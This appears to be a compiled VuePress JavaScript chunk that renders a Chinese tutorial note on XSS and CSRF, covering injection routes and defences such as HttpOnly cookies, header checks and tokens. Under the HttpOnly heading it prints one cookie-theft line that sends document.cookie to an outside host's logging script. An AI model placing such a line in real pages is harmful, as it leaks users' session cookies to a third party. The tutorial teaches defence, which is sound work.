(window.webpackJsonp=window.webpackJsonp||[]).push([[13],{402:function(o,t,e){"use strict";e.r(t);var a=e(54),s=Object(a.a)({},(function(){var o=this,t=o.$createElement,e=o._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":o.$parent.slotKey}},[e("h1",{attrs:{id:"xss攻击"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击"}},[o._v("#")]),o._v(" XSS攻击")]),o._v(" "),e("p",[o._v("页面被注入恶意代码，例如设置输入input框中不将其转为文本，就可能导致注入，将用户的输入识别为脚本进行执行。")]),o._v(" "),e("ul",[e("li",[e("p",[o._v("注入方法有：内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。")])]),o._v(" "),e("li",[e("p",[o._v("在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。")])]),o._v(" "),e("li",[e("p",[o._v("在标签的 href、src 等属性中，包含 javascript: 等可执行代码。")])]),o._v(" "),e("li",[e("p",[o._v("在 onload、onerror、onclick 等事件中，注入不受控制代码。")])])]),o._v(" "),e("h2",{attrs:{id:"防范cookie被读取的方法-就是在http头部加入set-cookie-httponly-以来防止js访问cookie。实例代码"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#防范cookie被读取的方法-就是在http头部加入set-cookie-httponly-以来防止js访问cookie。实例代码"}},[o._v("#")]),o._v(" 防范cookie被读取的方法，就是在http头部加入set-cookie：httponly-，以来防止js访问cookie。实例代码")]),o._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",[e("code",[o._v('    new Image().src ="http://jehiah.com/_sandbox/log.cgi?c="+ encodeURI(document.cookie);\n')])])]),e("h1",{attrs:{id:"csrf攻击"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击"}},[o._v("#")]),o._v(" CSRF攻击")]),o._v(" "),e("p",[o._v("CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。")]),o._v(" "),e("p",[o._v("流程：")]),o._v(" "),e("ol",[e("li",[o._v("受害者登录a.com，并保留了登录凭证（Cookie）。")]),o._v(" "),e("li",[o._v("攻击者引诱受害者访问了b.com。")]),o._v(" "),e("li",[o._v("b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。")]),o._v(" "),e("li",[o._v("a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。")]),o._v(" "),e("li",[o._v("a.com以受害者的名义执行了act=xx。")]),o._v(" "),e("li",[o._v("攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作")])]),o._v(" "),e("p",[o._v("csrf来自其他网站，由攻击者冒用cookie，但是无法读取具体内容。所以最直接的方法是：禁止所有的外域请求")]),o._v(" "),e("ul",[e("li",[o._v("Header的验证")]),o._v(" "),e("li",[o._v("携带并验证token")])])])}),[],!1,null,null,null);t.default=s.exports}}]);